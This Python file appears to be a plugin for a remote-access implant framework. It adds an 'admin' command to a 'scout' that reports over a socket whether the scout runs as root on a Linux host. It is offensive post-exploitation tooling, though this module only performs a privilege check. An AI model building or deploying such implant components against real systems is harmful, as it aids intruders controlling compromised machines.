# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('from os import getuid')
        self.config.functions.append('''
def admin():
    send_all(s,'[*]Scout is running as root process : ' + str(getuid() == 0))''')
        self.config.logics.append('''
            elif command == "admin":
                admin()''')
        self.config.help_menu['admin'] = 'Checks to see if the scout is running as a process with admin privileges'
    elif option == 'info':
        self.log.blank('\nName             : Check Admin component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : os' \
                       '\nCommands         : admin' \
                       '\nDescription      : Checks to see if the scout is running as a process with admin privileges\n')
        return {
                "Name": "Check Admin component",
                "OS": "Linux",
                "Required Modules": "os",
                "Commands": "admin",
                "Description": "Checks to see if the scout is running as a process with admin privileges"
            }